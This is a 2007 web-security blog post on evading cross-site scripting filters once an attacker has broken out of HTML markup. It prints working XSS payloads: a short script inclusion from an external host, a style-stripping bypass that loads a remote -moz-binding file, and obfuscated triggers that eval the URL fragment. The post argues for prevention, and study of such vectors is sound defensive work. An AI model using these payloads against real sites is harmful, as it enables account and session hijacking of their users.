---
title: The New Dawn Of Filter Evasion
author: mario-heiderich
date: Fri, 13 Jul 2007 06:57:16 GMT
template: post.jade
---

This article is about the most important phase when attacking web applications. The phase when the markup has just been broken and the attacker will try to inject his own markup, script code or other data - let's call it the PMBP (post-markup-breaking-phase). This phase is mostly possible to occur when quotes aren't correctly sanitized or when input is placed between two tags. In this article we will set the focus on the first variant - the attribute injection. And we will prove that protecting your markup from being broke into is the very most important task in client side security.

## Basic filtering

Many developers use standard filter functions to sanitize their output. Mostly a good idea, but the developer has to know what his filters and the attacker is capable of. Some say that the developer is to blame for the bugs, because he/she doesn't implement properly the security examples as they come from the books. Developers usually does not have enough _time_ and knowledge for cutting edge security research. Mostly of the time they need to chose between stripping the tags, converting HTML and special characters to entities, urlencoding the input, using approaches like [escapeshellcmd()](http://php.net/manual/en/function.escapeshellcmd.php) or even combining those filtering methods, in order to secure the applications they are working on. Usually those methods aren't used and combined with exact knowledge and so they tear open security holes or even cripple the user experience in some situations. Did you know that PHP's [escapeshellcmd()](http://php.net/manual/en/function.escapeshellcmd.php) leaves the characters `.-=a-Z0-9, space and /` untouched? This function is recommended by several books as a good filter alternative.

## Get it running

So what is the attacker able to do when he/she breaks out the markup, and injects new tags and attributes? When new tags can be injected the site is considered owned - even if there are filters that block script tags and iframes. It is interesting to look at the attributes. Depending on the browser - we're talking about the two major ones in this article - there are several ways to inject attributes that will fire JavaScript without requiring user interaction. If the attacker breaks out a tag which points to binary contents, like a link tag, an img tag or even an iframe, embed or object we can use the onerror handler and provide a crippled source attribute. Once the browser tries to load a source like _xxx_ it will fail and fire the event - for which we already injected a handler (javascript function call). On the other hand, we can utilize the style tag to create XSS without user interaction. Both gecko based browsers and all important IE versions ship proprietary selectors and methods to execute JavaScript within a style tag or attribute - just to name a few, we have: _-moz-binding_ and _expression()_. In order to exploit these situations the attacker has to inject more code. I've seen several websites where developers seemed to know that and had implemented filters that stripped a bunch of special chars - sometimes dot and brackets, sometimes other stuff - to avoid the injection of active code. Unfortunately, there's a way to circumvent all of them.

## Circumvent the ignorance

One of the most common filters - never understood why - is the stripping of the pattern _http://_. It seems thousands of developers out there believe that without this string it's not possible to get an external inclusion running and furthermore without an external inclusion you can't do much bad stuff on the targeted application. This is not true. It has been moths ago since I've published a miniaturized vector for script inclusions - 20 characters of length which does not have the _http://_ string. The cross browser version is 27 characters in length. Same goes for filtering the dot, brackets, spaces etc. Here is an example:

	<script src=//h4k.in 

Some filters transform all user input to uppercase letters - which is more useless than stripping _http://_ string. A major portal about a server side programming languages once suffered from a bad filter which stripped out all event handlers beginning with _on\w+_ and _style_. This is good example. Plain stripping will **never** make sense - the filter was easily circumvented by the following:

	sstyle="foobar"tstyle="foobar"ystyle="foobar"lstyle="foobar"estyle="foobar"=-moz-binding:url(http://h4k.in/mozxssc.xml#xss)>foo

But it's even getting better. Some weeks ago a pretty new and very intelligent kind of filter evading vectors came to light - these vectors were capable of carrying large payloads in totally stealth mode. These vectors does not require externally hosted scripts to perform the task. This is the reason why they are called [self contained XSS](/blog/one-drop-on-a-spider-web).

## CSO's nightmare

Self contained XSS is mostly based on the fact, that it's possible to pass values via URL, that are seen by the client only, but not by the server. Those values are called fragment identifiers. Everything passed behind the URL hash (#) is only visible to the client which includes the JavaScript runtime engine. So, the attacker just needs to inject a code snippet that evaluates the contents of this part of the URL - which is mostly very short and contains no information of what the real payload consists of. Due to the very dynamic nature of JavaScript it is possible to create _myriads_ of variants of those payload triggers and in combination with browser peculiarities the possibilities of creating these triggers become uncountable. Here is an exmaple

	eval.call(this,unescape.call(this,location))
	code:_=eval,__=unescape,___=document.URL,_(__(___)) code:with(location)with(hash)eval(substring(1))

Of course, it's also possible to rip these functions apart, shuffle their fragments and compose them back together at the end like this:

	l=0||'str',m= 0||'sub',x= 0||'al',y= 0||'ev',g= 0||'tion.h',f= 0 ||'ash',k= 0||'loca',d=(k)+(g)+(f),a

## Conclusion and credits

So - why are we showing all those vectors and talking about all the possibilities to hide, obfuscate possible attacks and evade filter mechanisms? To prove a point, I must say! Once the attacker breaks the markup he/she becomes in charge of that content - whether there's a filter between the application and the user or not. There's no way of finding a perfect balance between effective filtering and not crippling the user's experience. To make it short - the PMBP **must** never happen. In order to make this article a dirty cliffhanger - in the next part we will talk about how to avoid this exact phase. We'll learn how to make sure the user won't be annoyed by your filter and still guaranteeing stalwart security too. Credits for the shown vectors go the author, the [PHPIDS Group](http://groups.google.de/group/php-ids/), [Giorgio Maone](http://maone.net/), [Kishor](http://wasjournal.blogspot.com/), [Martin Hinks](http://the-mice.co.uk/switch/), [Christian Matthies](http://christ1an.blogspot.com/), [sirdarckcat](http://www.sirdarckcat.net/) and the guys from [sla.ckers.org](http://sla.ckers.org/forum/).
